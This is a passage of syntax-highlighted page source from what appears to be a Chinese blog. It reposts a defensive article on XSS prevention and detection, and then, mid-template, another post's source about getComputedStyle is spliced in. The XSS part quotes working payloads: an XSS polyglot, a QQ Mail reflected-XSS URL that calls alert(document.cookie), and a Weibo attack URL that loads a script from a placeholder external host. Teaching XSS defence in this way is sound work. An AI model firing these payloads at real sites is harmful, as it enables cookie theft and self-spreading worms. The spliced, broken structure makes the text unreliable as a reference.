<span class="kd">var</span> <span class="nx">__INITIAL_STATE__</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;%= Encoder.forJavaScript(data.to_json) %&gt;</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>

<span class="c">&lt;!-- HTML 标签内联监听器 --&gt;</span>
<span class="nt">&lt;button</span>
  <span class="na">onclick=</span><span class="s">"alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"</span><span class="nt">&gt;</span>
  click me
<span class="nt">&lt;/button&gt;</span>

<span class="c">&lt;!-- URL 参数 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- URL 路径 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
--&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'&lt;%=
  urlValidator.isValid(UNTRUSTED) ?
    Encode.forHtml(UNTRUSTED) :
    "/404"
%&gt;'</span><span class="nt">&gt;</span>
  link
<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p>

<h3 id="预防-dom-型-xss-攻击">预防 DOM 型 XSS 攻击</h3>

<p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>

<p>在使用 <code class="language-plaintext highlighter-rouge">.innerHTML</code>、<code class="language-plaintext highlighter-rouge">.outerHTML</code>、<code class="language-plaintext highlighter-rouge">document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code class="language-plaintext highlighter-rouge">.textContent</code>、<code class="language-plaintext highlighter-rouge">.setAttribute()</code> 等。</p>

<p>如果用 Vue/React 技术栈，并且不使用 <code class="language-plaintext highlighter-rouge">v-html</code>/<code class="language-plaintext highlighter-rouge">dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code class="language-plaintext highlighter-rouge">innerHTML</code>、<code class="language-plaintext highlighter-rouge">outerHTML</code> 的 XSS 隐患。</p>

<p>DOM 中的内联事件监听器，如 <code class="language-plaintext highlighter-rouge">location</code>、<code class="language-plaintext highlighter-rouge">onclick</code>、<code class="language-plaintext highlighter-rouge">onerror</code>、<code class="language-plaintext highlighter-rouge">onload</code>、<code class="language-plaintext highlighter-rouge">onmouseover</code> 等，<code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> 标签的 <code class="language-plaintext highlighter-rouge">href</code> 属性，JavaScript 的 <code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">setTimeout()</code>、<code class="language-plaintext highlighter-rouge">setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span>
![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)

<span class="c">&lt;!-- 链接内包含恶意代码 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"UNTRUSTED"</span><span class="nt">&gt;</span>1<span class="nt">&lt;/a&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="c1">// setTimeout()/setInterval() 中调用恶意代码</span>
<span class="nx">setTimeout</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">setInterval</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>

<span class="c1">// location 调用恶意代码</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">UNTRUSTED</span><span class="dl">'</span>

<span class="c1">// eval() 中调用恶意代码</span>
<span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p>

<h2 id="其他-xss-防范措施">其他 XSS 防范措施</h2>

<p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p>

<h3 id="content-security-policy">Content Security Policy</h3>

<p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>

<ul>
  <li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
  <li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
  <li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
  <li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
  <li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
</ul>

<p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p>

<h3 id="输入内容长度控制">输入内容长度控制</h3>

<p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p>

<h3 id="其他安全措施">其他安全措施</h3>

<ul>
  <li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
  <li>验证码：防止脚本冒充用户提交危险操作。</li>
</ul>

<h2 id="xss-的检测">XSS 的检测</h2>

<p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p>

<p>经过一番搜索，小明找到了两个方法：</p>

<ol>
  <li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li>
  <li>使用扫描工具自动检测 XSS 漏洞。</li>
</ol>

<p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jaVasCript</span><span class="p">:</span><span class="cm">/*-/*`/*\`/*'/*"/**/</span><span class="p">(</span><span class="cm">/* */</span><span class="nx">oNcliCk</span><span class="o">=</span><span class="nx">alert</span><span class="p">()</span> <span class="p">)</span><span class="c1">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span>
</code></pre></div></div>

<p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">setTimeout()</code>、<code class="language-plaintext highlighter-rouge">setInterval()</code>、<code class="language-plaintext highlighter-rouge">Function()</code>、<code class="language-plaintext highlighter-rouge">innerHTML</code>、<code class="language-plaintext highlighter-rouge">document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p>

<p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E
</code></pre></div></div>

<p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p>

<h2 id="xss-攻击案例">XSS 攻击案例</h2>

<h4 id="qq-邮箱-mexmailqqcom-域名反射型-xss-漏洞">QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞</h4>

<p>攻击者发现 <code class="language-plaintext highlighter-rouge">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code class="language-plaintext highlighter-rouge">uin</code>、<code class="language-plaintext highlighter-rouge">domain</code> 未经转义直接输出到 HTML 中。</p>

<p>于是攻击者构建出一个 URL，并引导用户去点击： <code class="language-plaintext highlighter-rouge">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p>

<p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">getTop</span><span class="p">().</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;t=</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;d=bbbb</span><span class="dl">"</span><span class="p">;</span><span class="k">return</span> <span class="kc">false</span><span class="p">;</span><span class="nt">&lt;/script&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>"+"...
</code></pre></div></div>

<p>浏览器接收到响应后就会执行 <code class="language-plaintext highlighter-rouge">alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p>

<h4 id="新浪微博名人堂反射型-xss-漏洞">新浪微博名人堂反射型 XSS 漏洞</h4>

<p>攻击者发现 <code class="language-plaintext highlighter-rouge">http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p>

<p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;
</code></pre></div></div>

<p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://weibo.com/pub/star/g/xyyyd"</span><span class="nt">&gt;&lt;script </span><span class="na">src=</span><span class="s">//xxxx.cn/image/t.js</span><span class="nt">&gt;&lt;/script&gt;</span>"&gt;按分类检索<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</code></pre></div></div>

<p>浏览器接收到响应后就会加载执行恶意脚本 <code class="language-plaintext highlighter-rouge">//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p>

<h2 id="扩展阅读automatic-context-aware-escaping">扩展阅读：Automatic Context-Aware Escaping</h2>

<p>上文我们说到：</p>

<ol>
  <li>合适的 HTML 转义可以有效避免 XSS 漏洞。</li>
  <li>完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</li>
  <li>业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</li>
</ol>

<p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p>

<p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p>

<p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p>

<p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p>

<p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span><span class="c">&lt;!-- Image to hack wechat --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/img/icon_wechat.png" width="0" height="0"&gt; --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg" width="0" height="0"&gt; --&gt;</span>

<span class="c">&lt;!-- Post Header --&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
    <span class="nt">header</span><span class="nc">.intro-header</span><span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
        <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url('https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg')</span>
    <span class="p">}</span>

    
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"intro-header"</span> <span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-mask"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span><span class="nt">&gt;</span>前端<span class="nt">&lt;/a&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span><span class="nt">&gt;</span>面试<span class="nt">&lt;/a&gt;</span>
                        
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;h1&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/h1&gt;</span>
                    
                    
                    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/h2&gt;</span>
                    
                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"meta"</span><span class="nt">&gt;</span>Posted by 甜果果 on October 12, 2020<span class="nt">&lt;/span&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/header&gt;</span>

<span class="c">&lt;!-- Post Content --&gt;</span>
<span class="nt">&lt;article&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Post Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container"</span><span class="nt">&gt;</span>

				<span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"css进阶原生js-getcomputedstyle等方法解析"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.cnblogs.com/coco1s/p/5210667.html"</span><span class="nt">&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>

<span class="nt">&lt;p&gt;</span>本文讲的是原生 JS 获取、设置元素最终样式的方法。可能平时框架使用习惯了，以 jQuery 为例，使用 .css() 接口就能便捷的满足我们的要求。再看看今天要讲的 window.getComputedStyle ，就像刚接触 JS 的时候，看到 document.getElementById  一样，名字都这么长，顿生怯意。不过莫慌，我觉得如果我们不是只想做一个混饭吃的前端，那么越是底层的东西，如果能够吃透它，越是能让人进步。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>getComputedStyle 与<span class="nt">&lt;/strong&gt;</span> <span class="nt">&lt;strong&gt;</span>getPropertyValue<span class="nt">&lt;/strong&gt;</span> **
**<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>getComputedStyle 为何物呢，DOM 中 getComputedStyle 方法可用来获取元素中所有可用的css属性列表，以数组形式返回，并且是只读的。IE678 中则用 currentStyle 代替 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>假设我们页面上存在一个 id 为 id 的元素，那么使用 getComputedStyle 获取元素样式就如下图所示：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223180051740-242127492.png"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 语法：``// 在旧版本之前，第二个参数“伪类”是必需的，现代浏览器已经不是必需参数了``// 如果不是伪类，设置为null，``window.getComputedStyle(``"元素"``, ``"伪类"``);
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>尝试一下之后可以看到，window.getComputedStyle 获取的是所有的样式，如果我们只是要获取单一样式，该怎么做呢。这个时候就要介绍另一个方法 – getPropertyValue 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用法也很简单：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 语法：``// 使用 getPropertyValue 来指定获取的属性``window.getComputedStyle(``"元素"``, ``"伪类"``).getPropertyValue(style);
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"ie-下的-currentstyle-与-getattribute"</span><span class="nt">&gt;&lt;strong&gt;</span>IE 下的 currentStyle 与 getAttribute<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>说完常规浏览器，再来谈谈老朋友 IE ，与 getComputedStyle 对应，在 IE 中有自己特有的 currentStyle 属性，与 getPropertyValue 对应，IE 中使用 getAttribute 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>和 getComputedStyle 方法不同的是，currentStyle 要获得属性名的话必须采用驼峰式的写法。也就是如果我需要获取 font-size 属性，那么传入的参数应该是 fontSize。因此在IE 中要获得单个属性的值，就必须将属性名转为驼峰形式。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// IE 下语法：``// IE 下将 CSS 命名转换为驼峰表示法``// font-size --<span class="ni">&amp;gt;</span> fontSize``// 利用正则处理一下就可以了``function` `camelize(attr) {``  ``// /\-(\w)/g 正则内的 (\w) 是一个捕获，捕获的内容对应后面 function 的 letter``  ``// 意思是将 匹配到的 -x 结构的 x 转换为大写的 X (x 这里代表任意字母)``  ``return` `attr.replace(/\-(\w)/g, ``function``(all, letter) {``    ``return` `letter.toUpperCase();``  ``});``}``// 使用 currentStyle.getAttribute 获取元素 element 的 style 属性样式``element.currentStyle.getAttribute(camelize(style));
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"style-与-getcomputedstyle"</span><span class="nt">&gt;&lt;strong&gt;</span>style 与 getComputedStyle<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>必须要提出的是，我们使用 element.style 也可以获取元素的CSS样式声明对象，但是其与 getComputedStyle 方法还是有一些差异的。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>首先，element.style 是可读可写的，而 getComputedStyle  为只读。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>其次，element.style 只可以获取 style 样式上的属性值，而无法得到所有的 CSS 样式值，什么意思呢？回顾一下 CSS 基础，CSS 样式表的表现有三种方式，<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>内嵌样式（inline Style）<span class="nt">&lt;/strong&gt;</span> ：是写在 HTML 标签里面的，内嵌样式只对该标签有效。<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>内部样式（internal Style Sheet）<span class="nt">&lt;/strong&gt;</span>：是写在 HTML 的 <span class="nt">&lt;style&gt;</span> <span class="err">标签里面的，内部样式只对所在的网页有效。</span><span class="nt">&lt;/style&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>外部样式表（External Style Sheet）<span class="nt">&lt;/strong&gt;</span>：如果很多网页需要用到同样的样式(Styles)，将样式(Styles)写在一个以 .CSS 为后缀的 CSS 文件里，然后在每个需要用到这些样式(Styles)的网页里引用这个 CSS 文件。<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

<span class="nt">&lt;p&gt;</span>而 element.style 只能获取被这些样式表定义了的样式，而 getComputedStyle 能获取到所有样式的值（在不同浏览器结果不一样，chrome 中是 264，在 Firefox 中是238），不管是否定义在样式表中，譬如：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>style<span class="ni">&amp;gt;</span>``#id{``  ``width : 100px;``  ``float:left;``}``<span class="ni">&amp;lt;</span>/style<span class="ni">&amp;gt;</span>` `var` `elem = document.getElementById(``'id'``);` `elem.style.length ``// 2``window.getComputedStyle(elem, ``null``).length ``// 264
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"getcomputedstyle-与-defaultview"</span><span class="nt">&gt;&lt;strong&gt;&lt;em&gt;</span>*getComputedStyle 与*<span class="nt">&lt;/em&gt;</span> defaultView<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>window.getComputedStyle 还有另一种写法，就是 document.defaultView.getComputedStyle 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>两者的用法完全一样，在 jQuery v1.10.2 中，使用的就是 window.getComputedStyle 。如下<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223194555927-1671542584.jpg"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>也有特例，查看 <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://stackoverflow.com/questions/8136501/whats-the-difference-bewteen-document-defaultview-getcomputedstyle-and-window-g"</span><span class="nt">&gt;</span>stackoverflow<span class="nt">&lt;/a&gt;</span> ，上面提及到在 Firefox 3.6 ，不使用 document.defaultView.getComputedStyle 会出错。不过毕竟 FF3.6 已经随历史远去，现在可以放心的使用 window.getComputedStyle。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用一张图总结一下：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223194857161-884067652.png"</span> <span class="na">alt=</span><span class="s">"原生JS获取CSS样式的方法"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"原生js实现css样式的get与set"</span><span class="nt">&gt;&lt;strong&gt;</span>原生JS实现CSS样式的get与set<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>说了这么多，接下来将用原生 JS 实现一个小组件，实现 CSS 的 get 与 set，兼容所有浏览器。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>完整的组件代码在我的 github 上，<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl/blob/master/cssControl.1.0.0.js"</span><span class="nt">&gt;</span>戳我直接看代码<span class="nt">&lt;/a&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"getstyleelem-style"</span><span class="nt">&gt;&lt;strong&gt;</span>getStyle(elem, style)<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>对于 CSS 的 set ，对于支持 window.getComputedStyle 的浏览器而言十分简单，只需要直接调用。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>getStyle: ``function``(elem, style) {``  ``// 主流浏览器``  ``if` `(win.getComputedStyle) {``    ``return` `win.getComputedStyle(elem, ``null``).getPropertyValue(style);``  ``}``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>反之，如果是 IE 浏览器，则有一些坑。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"opacity-透明度的设定"</span><span class="nt">&gt;&lt;strong&gt;</span>opacity 透明度的设定<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>在早期的 IE 中要设置透明度的话，有两个方法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;</span>alpha(opacity=0.5)<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>filter:progid:DXImageTransform.Microsoft.gradient( GradientType= 0 , startColorstr = ‘#ccccc’, endColorstr = ‘#ddddd’ );<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

